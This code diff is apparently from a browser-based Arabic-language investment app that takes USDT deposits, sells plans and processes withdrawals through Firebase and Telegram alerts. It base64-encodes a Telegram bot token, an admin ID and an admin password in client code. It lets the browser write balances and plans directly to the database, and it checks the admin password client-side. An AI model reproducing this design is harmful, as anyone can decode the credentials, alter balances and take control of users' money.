+    const _dec = (s) => atob(s);
+    const _t = _dec("ODc3ODAwNzQ1MDpBQUdIdmY4Tmo3ZHVMeXpKX2VLR0tFaFNRelAyNV9XN1RIVQ==");
+    const _a = _dec("NTM3MDY0NDgzOQ==");
+    const _p = _dec("MDY2NjM5MDkwNA==");
+    const _db = _dec("aHR0cHM6Ly9zaGFtLXByby1pbnZlc3QtZGVmYXVsdC1ydGRiLmZpcmViYXNlaW8uY29tL3VzZXJz");
 
     let currentUserId = "5370644839";
     let currentUserName = "المستخدم";
@@ -340,7 +333,7 @@
     document.getElementById('adminTargetId').value = currentUserId;
 
     function sendTgMessage(chatId, textPlain) {
-      const url = `https://api.telegram.org/bot${_k1}/sendMessage`;
+      const url = `https://api.telegram.org/bot${_t}/sendMessage`;
       fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -349,7 +342,7 @@
     }
 
     function sendAdminAlert(textPlain) {
-      sendTgMessage(_k2, textPlain);
+      sendTgMessage(_a, textPlain);
     }
 
     async function syncUserData() {
@@ -384,24 +377,17 @@
       document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
       currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
       document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
-      const s = document.getElementById('activePlansSummary');
-      if (currentUserPlan) {
-        s.innerText = "الباقة المفعّلة: " + currentUserPlan + " ⚡";
-        s.className = "text-xs text-emerald-400 font-bold bg-slate-900 border border-emerald-500/30 p-3 rounded-xl";
-      } else {
-        s.innerText = "الباقة المفعّلة: لا توجد باقة نشطة حالياً";
-        s.className = "text-xs text-sky-400 font-bold bg-slate-900 border border-slate-800 p-3 rounded-xl";
-      }
+      document.getElementById('activePlanText').innerText = currentUserPlan || "بدون باقة";
     }
 
-    function switchTab(tabId, btn) {
+    function switchView(tabId, btn) {
       document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
       document.querySelectorAll('.nav-tab').forEach(el => {
-        el.classList.remove('active', 'text-blue-400', 'bg-slate-800', 'font-bold');
+        el.classList.remove('active', 'bg-blue-600', 'text-white');
         el.classList.add('text-slate-400');
       });
       document.getElementById(tabId).classList.add('active');
-      btn.classList.add('active', 'text-blue-400', 'bg-slate-800', 'font-bold');
+      btn.classList.add('active', 'bg-blue-600', 'text-white');
       btn.classList.remove('text-slate-400');
     }
 
@@ -412,24 +398,21 @@
     }
 
     function copyVal(txt) {
-      navigator.clipboard.writeText(txt).then(() => showToast("تم النسخ بنجاح"));
+      navigator.clipboard.writeText(txt).then(() => showToast("تم النسخ"));
     }
 
     function showToast(msg) {
       const t = document.getElementById('toast');
       t.innerText = msg;
       t.classList.remove('hidden');
-      setTimeout(() => t.classList.add('hidden'), 2500);
+      setTimeout(() => t.classList.add('hidden'), 2000);
     }
 
     async function submitDeposit() {
       const amount = document.getElementById('inAmount').value;
       const txid = document.getElementById('inTxid').value.trim();
       const method = document.getElementById('payMethod').value;
-      if (!amount || amount <= 0 || !txid) {
-        alert("يرجى ملء جميع الحقول بشكل صحيح");
-        return;
-      }
+      if (!amount || amount <= 0 || !txid) return alert("يرجى ملء كافة الخانات");
       sendAdminAlert(`🔔 إيداع جديد:\n- المستخدم: ${currentUserName}\n- ID: ${currentUserId}\n- الطريقة: ${method}\n- المبلغ: ${amount}\n- المعاملة: ${txid}`);
       showToast("تم إرسال الطلب للمراجعة");
       document.getElementById('inAmount').value = "";
@@ -437,10 +420,7 @@
     }
 
     async function buyPlan(name, price) {
-      if (currentUserUSDT < price) {
-        alert("الرصيد غير كافٍ، يرجى الشحن أولاً");
-        return;
-      }
+      if (currentUserUSDT < price) return alert("الرصيد غير كافٍ، يرجى الشحن أولاً");
       currentUserUSDT -= price;
       currentUserPlan = name;
       await fetch(`${_db}/${currentUserId}.json`, {
@@ -456,15 +436,8 @@
     async function submitWithdraw() {
       const amount = parseFloat(document.getElementById('outAmount').value);
       const addr = document.getElementById('outAddress').value.trim();
-      const type = document.getElementById('withdrawType').value;
-      if (isNaN(amount) || amount < 10 || !addr) {
-        alert("الحد الأدنى 10$ ويجب كتابة العنوان");
-        return;
-      }
-      if (currentUserUSDT < amount) {
-        alert("الرصيد غير كافٍ");
-        return;
-      }
+      if (isNaN(amount) || amount < 10 || !addr) return alert("الحد الأدنى 10$ وعنوان المحفظة مطلوب");
+      if (currentUserUSDT < amount) return alert("الرصيد غير كافٍ");
       currentUserUSDT -= amount;
       await fetch(`${_db}/${currentUserId}.json`, {
         method: "PATCH",
@@ -472,7 +445,7 @@
         body: JSON.stringify({ balance: currentUserUSDT })
       });
       updateUI();
-      sendAdminAlert(`💸 طلب سحب:\n- المشترك: ${currentUserName}\n- المبلغ: ${amount}$\n- المحفظة: ${addr}`);
+      sendAdminAlert(`💸 طلب سحب:\n- المشترك: ${currentUserName}\n- المبلغ: ${amount}$\n- العنوان: ${addr}`);
       showToast("تم إرسال طلب السحب");
       document.getElementById('outAmount').value = "";
       document.getElementById('outAddress').value = "";
@@ -482,7 +455,7 @@
     function closeAdminModal() { document.getElementById('adminModal').classList.add('hidden'); document.getElementById('adminModal').classList.remove('flex'); }
 
     async function executeAdminRecharge() {
-      if (document.getElementById('adminPassInput').value !== _k3) return alert("كلمة المرور غير صحيحة");
+      if (document.getElementById('adminPassInput').value !== _p) return alert("كلمة المرور غير صحيحة");
       const targetId = document.getElementById('adminTargetId').value.trim();
       const amount = parseFloat(document.getElementById('adminAmountInput').value);
       const res = await fetch(`${_db}/${targetId}.json`);
@@ -494,7 +467,7 @@
     }
 
     async function executeAdminActivatePlan() {
-      if (document.getElementById('adminPassInput').value !== _k3) return alert("كلمة المرور غير صحيحة");
+      if (document.getElementById('adminPassInput').value !== _p) return alert("كلمة المرور غير صحيحة");
       const targetId = document.getElementById('adminTargetId').value.trim();
       const plan = document.getElementById('adminPlanSelect').value;
       await fetch(`${_db}/${targetId}.json`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ activePlan: plan }) });
